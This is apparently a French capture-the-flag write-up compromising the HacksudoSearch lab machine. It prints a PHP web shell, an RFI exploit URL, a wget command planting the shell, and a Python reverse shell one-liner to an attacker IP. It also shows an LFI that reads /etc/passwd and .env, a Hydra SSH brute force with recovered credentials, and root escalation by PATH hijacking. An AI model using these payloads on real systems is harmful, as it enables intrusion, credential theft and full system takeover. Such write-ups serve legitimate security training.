# Nmap
 
   nmap hacksudo_search -A
 
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
   | ssh-hostkey:
   |   2048 7b:44:7c:da:fb:e5:e6:1d:76:33:eb:fa:c0:dd:77:44 (RSA)
   |   256 13:2d:45:07:32:83:13:eb:4e:a1:20:f4:06:ba:26:8a (ECDSA)
   |_  256 21:a1:86:47:07:1b:df:b2:70:7e:d9:30:e3:29:c2:e7 (ED25519)
   80/tcp open  http    Apache httpd 2.4.38 ((Debian))
   |_http-server-header: Apache/2.4.38 (Debian)
   |_http-title: HacksudoSearch
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
# Enumération Web
 
   gobuster dir -u http://hacksudo_search -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
Grace à un gobuster on trouve la page search1.php (avec l'option pour les extensions php)
 
# Première méthode: RFI*
 
 
Dans notre répertoire courant, on crée le fichier rfi.php tel que:
 
   <?php
   echo "<script>alert(Archimed own you);</script>";
   echo "Run command: ".htmlspecialchars($_GET['cmd']);
 
   system($_GET['cmd']);
   ?>
 
On créer un serveur HTTP à la volé à l'aide de python3:
 
   python -m http.server 8000
 
Puis on exploite la RFI avec le paramètre &cmd=id (pour vérifier que cela fonctionne) comme suit:
 
   http://192.168.0.37/search1.php?me=http://192.168.0.10:8000/rfi.php&cmd=id
 
Il est possible d'uploader un fichier sur le site internet en utilisant 'wget' et en plaçant un fichier malicieux sur notre serveur http provisoir
 
   http://192.168.0.37/search1.php?me=http://192.168.0.10:8000/rfi.php&cmd=wget+http://192.168.0.10:8000/rfi.php
 
Nous pouvons uploader le shell yolo.php
 
Lorsque nous accédons à la page http://hacksudo_search/yolo.php nous pouvons maintenant exécuter des commandes.
 
Avant toute chose, nous plaçons un netcat en écoute pour pouvoir y "envoyer" un shell
 
   netcat -lvnp 4242
 
Après avoir essayé quelques payload avec netcat et bash, c'est une reverse payload python qui à réussi à fonctionner:
 
   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.10",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 
# Seconde méthode: LFI
 
## Recherche de la LFI
 
En cliquant sur "Contact" on remarque qu'il est possible de passer des paramètres dans l'URL suivant:
 
   http://192.168.0.37/search1.php?FUZZ=contact.php
 
Il s'agit d'un indice non négligeable.
Essayons donc de "fuzzer" ce terme pour voir si une LFI est présente:
 
   wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.37/search1.php?FUZZ=../../../../../../../../etc/passwd
 
(On note le nombre de ligne qu'il y a sur les réponses "générique" et on ajoute l'option --hl (hide line) pour cacher ces réponses là et n'avoir que les réponses particulière)
 
   wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.0.37/search1.php?FUZZ=../../../../../../../../etc/passwd --hl 137
 
 
La LFI:
 
   http://192.168.0.37/search1.php?me=../../../../../../../etc/passwd
 
Cela nous permet d'avoir des users, maintenant pour les mot de passes essayons le fichier .env du répertoire courant:
 
   http://192.168.0.37/search1.php?me=.env
 
## BruteForce avec Hydra
 
bruteforce sur le service SSH à l'aide de hydra:
 
   hydra -L user -P pass 192.168.0.37 ssh
 
On trouve les crédentials suivants:
 
hacksudo:MyD4dSuperH3r0!
 
 
# Privilège Escalation
 
Une fois connecté, en utilisant linpeas.sh (télécharger à l'aide d'un get) on se rend comte qu'un fichier ./searchinstall possède un stickybit.
On peut aussi trouver à l'aide de ls -al -R (dans le répertoire de hacksudo).
ou la commande find permettant de trouver les sticky bits.
 
Le code C non compilé se trouve aussi dans le répertoire, on observe le code, il permet d'utiliser la commande "install" en temps que root (mais sans argument possible, donc impossible d'utiliser la méthode de GTFOBins).
 
On crée alors un fichier install comme suit:
 
   #!/bin/bash
   bash
 
On ajoute les droit d'exec, puis on ajoute le PATH du répertoire
 
export PATH = /home/hacksudo/search/tools:$PATH
 
En faisant ./searchinstall cela va chercher la commande install que nous avons créer et l'exécuter en temps que root. Dans ce cas précis, cela va nous fournir un shell bash avec les droits root.
 
 
 


